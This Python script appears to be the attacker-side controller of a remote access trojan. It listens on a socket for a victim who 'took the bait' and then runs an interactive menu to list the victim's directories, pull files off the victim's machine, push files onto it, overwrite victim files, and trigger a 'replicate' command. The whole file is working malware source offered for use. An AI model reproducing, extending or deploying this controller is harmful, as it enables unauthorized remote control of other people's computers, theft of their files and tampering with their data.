from socket import *
import shutil
import random
import os

host = "192.168.43.179"
port = 7000

s = socket(AF_INET, SOCK_STREAM)
s.bind((host,port))

s.listen(1)

print("Listening.....")

conn, address = s.accept()
print(address[0], "took the bait")


#Connection Done

try:
    while True:
        print("**********")
        command = input(str("Command >> "))
        if command == "vcd":
            conn.send(command.encode())
            files = conn.recv(5000)
            files = files.decode()
            print("Current Directory", files)

        elif command == "vfcd":
            conn.send(command.encode())

            directory = input(str('Enter Custom Directory: '))
            conn.send(directory.encode())

            print("Command has been sent")
            print("")

            full_message = conn.recv(100000)
            
            full_message = full_message.decode()

            count = ''
            i = 0

            while i < len(full_message) and full_message[i] != ';':
                count+= full_message[i]
                i+=1
            
            print(count + " Files in the Given Directory")
            print("")

            c = int(count)

            i+=1

            fileName = ''
            
            print("The files in the Given Directory are")

            for _ in range(c):
                while full_message[i] != ';' and i < len(full_message):
                    fileName += full_message[i]
                    i+=1
                
                print(fileName)

                fileName = ''
                i+=1


        elif command == "download_file":
            conn.send(command.encode())
            print("")
            filepath = input("Please Enter the File Path: ")
            print("")
            conn.send(filepath.encode())

            files = conn.recv(100000)

            fileName  =  input("Enter the file Name for the Incoming File: ")

            newFile = open(fileName,"wb")
            newFile.write(files)
            newFile.close()

            print("")

            print(fileName, "has been downloaded")

            print("")

        elif command == "upload":
            conn.send(command.encode())
            print("")
            fileTOBeUploaded = input("Enter The Name of the File to Be uploaded: ")

            filee = open(fileTOBeUploaded, "rb")
            data = filee.read()

            conn.send(data)
            print("File Uploaded")
            print("")

        
        elif command == 'replace':
            conn.send(command.encode())

            print("")
            filepath = input("Please Enter the File to be replaced: ")
            print("")
            conn.send(filepath.encode())

            contentToReplace = input("Enter The Name of the File to replace with : ")

            filee = open(contentToReplace, "rb")
            data = filee.read()

            conn.send(data)

            print("")

            print("Replced Successfully")

            print("")

        
        elif command == "replicate":
            conn.send(command.encode())
            print("")



        elif command == "exit":
            conn.send(command.encode())
            s.close()
            break


        else:
            conn.send("N/A".encode())
            print("")

        
except:
    conn.send("exit".encode())
    print("Fatal Error Occured")
    s.close()
